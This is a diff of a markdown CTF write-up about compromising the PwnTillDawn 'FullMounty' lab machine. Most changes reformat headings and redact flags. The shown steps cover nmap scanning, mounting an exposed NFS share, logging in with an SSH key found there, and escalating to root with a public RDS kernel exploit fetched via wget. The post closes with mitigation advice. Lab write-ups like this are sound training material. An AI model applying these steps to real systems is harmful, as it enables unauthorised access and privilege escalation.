@@ -3,7 +3,7 @@ icon: fas fa-info-circle
 order: 4
 categories: PwnTillDawn
 tags: NFS SSH RDS
-image: https://online.pwntilldawn.com/Content/img/machines/3.png
+image: https://online.pwntilldawn.com/Content/img/machines/64.png
 ---
 
 
@@ -18,7 +18,7 @@ In this write-up, we’ll unpack every step of the journey—from initial reconn
 Get ready to dive deep, think critically, and discover how persistence turns possibility into success.
 
 
-🔍 Initial Enumeration with Nmap
+## 🔍 Initial Enumeration with Nmap
 
  I began by performing a comprehensive port scan to identify open services and gather version information. The following Nmap command was used:
 ```php
@@ -92,13 +92,15 @@ Notable Details:
 
 ![screenshot](/assets/screenshots/FullMounty/1.webp)
 
- 📂 NFS Enumeration and Mounting
+## 📂 NFS Enumeration and Mounting
 
 After identifying NFS services on ports 111 and 2049, I probed for exported shares and successfully mounted one containing potentially sensitive files.
 
 Mount Command Used:
 ```php
 sudo mount -v -t nfs -o vers=3 10.150.150.134:/srv/exportnfs /tmp/mounty
+```
+Command Breakdown
 ```
 -t nfs: Specify NFS filesystem type
 
@@ -109,7 +111,8 @@ sudo mount -v -t nfs -o vers=3 10.150.150.134:/srv/exportnfs /tmp/mounty
 /tmp/mounty: Local mount point
 
 Mounted Share Contents:
-
+```
+The Contents of the share
 ```
 total 32
 drwxrwxrwx  5 nobody  nogroup 4096 Oct 29  2019 .
@@ -127,7 +130,7 @@ sudo cp -r /tmp/mounty/ .
 ```
 ![screenshot](assets/screenshots/FullMounty/2.webp)
 
-🏴 Flag Discovery & Credential Enumeration
+## 🏴 Flag Discovery & Credential Enumeration
 While reviewing the contents of the mounted NFS share, I discovered valuable information:
 
 ![screenshot](assets/screenshots/FullMounty/3.webp)
@@ -145,7 +148,7 @@ Private Key	id_rsa (SSH private key)
 Public Key	id_rsa.pub
 History File	.bash_history
 
-🔑 SSH Access Using Extracted Private Key
+## 🔑 SSH Access Using Extracted Private Key
 
 Initial Attempt:
 
@@ -197,7 +200,7 @@ drwx--x--- 2 root     root     4096 2019-10-28 03:01 .splunk
 drwx------ 2 deadbeef deadbeef 4096 2019-10-03 02:34 .ssh
 -rw-r--r-- 1 deadbeef deadbeef    0 2019-10-03 01:02 .sudo_as_admin_successful
 deadbeef@FullMounty:~$ cat FLAG50
-8f776e191c1253159ed20aa683b5d5969a804b83
+8f776e191c1253159e<REDACTED>b5d5969a804b83
 deadbeef@FullMounty:~$ cat FLAG51
 cat: FLAG51: Permission denied
 deadbeef@FullMounty:~$ 
@@ -205,7 +208,7 @@ deadbeef@FullMounty:~$
 ![screenshot](assets/screenshots/FullMounty/6.webp)
 
 
-🚀 Privilege Escalation
+## 🚀 Privilege Escalation
 
 After obtaining SSH access as the deadbeef user, I began enumerating the target system for privilege escalation vectors.
 
@@ -219,13 +222,13 @@ GitHub - https://github.com/lucyoa/kernel-exploits/blob/master/rds/rds
 
 📥 Exploit Transfer
 
-Instead of using scp, I opted to serve the exploit locally with a simple Python HTTP server and retrieve it on the target with wget.
+I serveD the exploit locally with a simple Python HTTP server and retrieve it on the target with wget.
 
 Steps Taken:
 
-    Download the Exploit Locally:
+Download the Exploit Locally:
 
-    On my attacker machine:
+On my attacker machine:
 ```
 wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/rds/rds.c -O rds.c
 ```
@@ -288,7 +291,9 @@ f4ba5b1880b551<REDACTED>4f1727eb0e
 ✅ Conclusion
 
 This engagement demonstrated how a combination of weakly secured services and an unpatched kernel can lead to full system compromise. By enumerating exposed NFS shares, recovering sensitive credentials, and exploiting a known kernel vulnerability, I was able to escalate privileges from a regular user to root.
-🛡️ Mitigation Recommendations
+
+
+## 🛡️ Mitigation Recommendations
 
 To prevent similar attacks, I recommend the following actions:
 
